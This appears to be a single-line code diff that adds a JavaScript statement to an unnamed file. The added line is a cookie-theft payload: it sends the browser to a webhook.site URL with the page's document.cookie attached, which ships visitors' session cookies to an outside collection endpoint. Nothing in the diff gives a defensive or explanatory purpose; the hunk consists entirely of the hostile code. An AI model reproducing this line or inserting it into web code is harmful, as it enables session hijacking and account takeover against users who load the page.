@@ -1,0 +1,1 @@
+window.location="https://webhook.site/8bb7d716-2b5e-43e4-a93a-9858c832ce0b?c=".concat(document.cookie)
